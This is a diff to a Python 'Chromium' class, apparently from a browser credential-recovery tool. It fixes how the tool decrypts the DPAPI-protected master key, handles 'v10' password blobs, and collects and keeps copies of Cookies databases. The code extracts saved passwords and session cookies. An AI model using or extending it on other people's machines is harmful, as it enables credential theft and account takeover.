@@ -37,7 +37,7 @@ class Chromium:
                 if os.path.isdir(os.path.join(path, dirs)) and dirs.startswith('Profile'):
                     profiles.add(dirs)
 
-            with open(profiles_path) as f:
+            with open(profiles_path, 'rb') as f:
                 try:
                     data = json.load(f)
                     # Add profiles from json to Default profile. set removes duplicates
@@ -45,7 +45,7 @@ class Chromium:
                 except Exception:
                     pass
 
-            with open(profiles_path) as f:
+            with open(profiles_path, 'rb') as f:
                 try:
                     master_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]  # removing DPAPI
                     master_key = CryptUnprotectData(master_key, profile)
@@ -104,7 +104,7 @@ class Chromium:
             # cipher = AES.new(yandex_enckey, AES.MODE_GCM)
             # plaintext = cipher.decrypt(password)
             # Failed...
-        elif isinstance(password, bytes) and password.endswith(b'v10'):
+        elif isinstance(password, bytes) and password.startswith(b'v10'):
             if master_key:
                 # chromium version > 80
                 try:
@@ -214,8 +214,7 @@ class Chromium:
             except Exception:
                 log.debug(traceback.format_exc())
 
-            database_path = os.path.split(database_path)
-            database_path = os.path.join(database_path[0], 'Cookies')
+            database_path = os.path.join(os.path.split(database_path)[0], 'Cookies')
 
             if not os.path.exists(database_path):
                 continue
@@ -226,7 +225,7 @@ class Chromium:
             try:
                 found = self.cookie_dump(profile, temp, master_key)
                 if found:
-                    cookies[database_path] = found
+                    cookies[database_path] = [found, temp]
                 else:
                     os.remove(temp)
             except Exception:
@@ -234,7 +233,7 @@ class Chromium:
 
         ret = {}
         if cookies:
-            ret['Cookies'] = list(cookies)
+            ret['Cookies'] = cookies
         if credentials:
             ret['Credentials'] = credentials
         return ret
